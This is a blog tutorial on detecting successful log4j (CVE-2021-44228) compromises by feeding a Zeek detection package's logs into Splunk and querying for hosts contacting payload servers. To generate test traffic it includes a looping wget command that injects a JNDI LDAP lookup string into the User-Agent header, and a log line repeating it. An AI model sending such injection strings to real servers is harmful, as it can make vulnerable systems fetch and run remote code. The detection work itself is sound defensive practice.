---
title: "Detecting successful log4j compromises with Zeek and Splunk"
date: 2021-12-22T18:45:00-06:00
toc: false
images:
categories:
  - tech
tags: 
  - splunk
  - zeek
  - log4j
  - cve-2021-44228
description: How to detect and alert on successful log4j compromises with Zeek and Splunk.
---

By using the log4j Zeek package [CVE-2021-44228](https://github.com/corelight/cve-2021-44228) and sending the logs off to Splunk, security analysts can detect successful log4j compromises by alerting on hosts reaching out to log4j payload servers.  

## TL;DR

This Splunk one-liner will first query the zeek_log4j.log to determine the log4j payload IP address then take these results and query the zeek_conn.log to find any successful communication to the payload server(s):

```text
index=zeek sourcetype=zeek_conn [search index=zeek sourcetype=zeek_log4j | dedup target_host | fields target_host | rename target_host as id.resp_h]
```

Example output (using a bogus log4j payload IP address):

[![Image of ](/images/2021-12-23-13-43-55.png)](/images/2021-12-23-13-43-55.png)


## Details

Note: [Installing Splunk](/posts/drafts/installsplunk/) and Zeek are out of scope. There are lots of good tutorials on the web.


First download the Zeek log4j detection package:

```text
git clone https://github.com/corelight/cve-2021-44228.git
```

Example output:

```
jemurray@zeek:~$ git clone https://github.com/corelight/cve-2021-44228.git
Cloning into 'cve-2021-44228'...
remote: Enumerating objects: 259, done.
remote: Counting objects: 100% (45/45), done.
remote: Compressing objects: 100% (31/31), done.
remote: Total 259 (delta 19), reused 23 (delta 14), pack-reused 214
Receiving objects: 100% (259/259), 68.60 KiB | 4.90 MiB/s, done.
Resolving deltas: 100% (114/114), done.
```

Install the Zeek package:

```text
sudo zkg install cve-2021-44228
```

Example output:

```
jemurray@zeek:~$ sudo zkg install cve-2021-44228
The following packages will be INSTALLED:
  /home/jemurray/cve-2021-44228 (develop)

Proceed? [Y/n] y
Installing "/home/jemurray/cve-2021-44228"
Installed "/home/jemurray/cve-2021-44228" (develop)
Loaded "/home/jemurray/cve-2021-44228"
```

Deploy the changes:

```text
sudo zeekctl deploy
```

Example output:

```
jemurray@zeek:/usr/local/zeek/logs/current$ sudo zeekctl deploy
[sudo] password for jemurray:
checking configurations ...
installing ...
removing old policies in /usr/local/zeek/spool/installed-scripts-do-not-touch/site ...
removing old policies in /usr/local/zeek/spool/installed-scripts-do-not-touch/auto ...
creating policy directories ...
installing site policies ...
generating standalone-layout.zeek ...
generating local-networks.zeek ...
generating zeekctl-config.zeek ...
generating zeekctl-config.sh ...
stopping ...
stopping zeek ...
starting ...
starting zeek ...
```

Validate Zeek is running:

```text
sudo /usr/local/zeek/bin/zeekctl status
```

Example output:

```
jemurray@zeek:~$ sudo /usr/local/zeek/bin/zeekctl status
Name         Type       Host          Status    Pid    Started
zeek         standalone localhost     running   36810  22 Dec 18:47:04
```

Validate the package is loaded:

```text
cat /usr/local/zeek/logs/current/loaded_scripts.log | grep -i cve
```

Example output:

```
jemurray@zeek:/usr/local/zeek/logs/current$ cat loaded_scripts.log | grep -i cve
{"name":"    /usr/local/zeek/spool/installed-scripts-do-not-touch/site/packages/cve-2021-44228/__load__.zeek"}
{"name":"      /usr/local/zeek/spool/installed-scripts-do-not-touch/site/packages/cve-2021-44228/CVE_2021_44228.zeek"}
{"name":"      /usr/local/zeek/spool/installed-scripts-do-not-touch/site/packages/cve-2021-44228/CVE_2021_44228_java_GET.zeek"}
```

Generate bogus log4j payloads (using a host also reaching out to the payload IP address):

```text
while [ 1 ]; do echo "running..."; wget -4 --user-agent='${jndi:ldap://104.131.191.87:1389/jasonmurraytest}' http://shell.jasonmurray.org/ -o /dev/null; sleep 1; done
```

Check the log4j.log to validate proper logging:

```
jemurray@zeek:/usr/local/zeek/logs/current$ cat log4j.log
{"ts":1640221805.21603,"uid":"CkoJU1Cmo48NACFDg","http_uri":"http://jasonmurray.org/","uri":"104.131.191.87:1389/jasonmurraytest","stem":"104.131.191.87:1389","target_host":"104.131.191.87","target_port":"1389","method":"GET","is_orig":true,"name":"USER-AGENT","value":"${jndi:ldap://104.131.191.87:1389/jasonmurraytest}","matched_name":false,"matched_value":true}
```

Setup the Splunk UniversalForwarder to send log4j.logs to Splunk by adding the following lines to the `/opt/splunkforwarder/etc/system/local/inputs.conf` file:

```text
[monitor:///usr/local/zeek/logs/current/log4j.log]
_TCP_ROUTING = *
index = zeek
sourcetype = zeek_log4j
```

Restart the UniversalForwarder:

```text
sudo /opt/splunkforwarder/bin/splunk restart
```

Example output:

```
jemurray@zeek:/opt/splunkforwarder/etc/system/local$ sudo /opt/splunkforwarder/bin/splunk restart
Stopping splunkd...
Shutting down.  Please wait, as this may take a few minutes.

Stopping splunk helpers...

Done.
....
All preliminary checks passed.

Starting splunk server daemon (splunkd)...
Done
```
To generate testing data in this lab environment. I am running the `wget` command on a host performing the commands necessary to compromise the target and communicate with a host where the malicious payload is hosted. 

The following query will first [subsearch](https://docs.splunk.com/Documentation/SplunkCloud/latest/SearchTutorial/Useasubsearch) the zeek_log4j.log to find all the unique instances of log4j payload hosts. Again, these are the hosts a compromised device will contact to download the malicious payload. Once the target hosts are identified, another query is made to the zeek_conn.log to find any instances where local devices reached out the payload host.


```
index=zeek sourcetype=zeek_conn [search index=zeek sourcetype=zeek_log4j | dedup target_host | fields target_host | rename target_host as id.resp_h]
```

Any results to this query indicate a device on the local network is reaching out to a server hosting malicious log4j payloads:

[![Image of ](/images/2021-12-23-13-43-55.png)](/images/2021-12-23-13-43-55.png)


## Next Steps

This is a quick and dirty demonstration of Zeek and Splunk's ability to reliably find exploited hosts reaching out to servers hosting malicious log4j payloads. There are a number of way to improve detection.

- Include additional log sources, such a web servers, load balancers, etc.  The log4j detection within Zeek, does not capture SSL encrypted connections.
- Tighten the Splunk zeek_conn.log query to only include connection flags of successful connections.
- Convert hostnames in the log4j payloads to IP addresses.
- Support IPv6.
- Add this query to the Splunk automated alerts.

Log4j is a serious flaw. It is better to get automated detection setup now and refine it later.  A few false positives are better then not detecting anything at all.


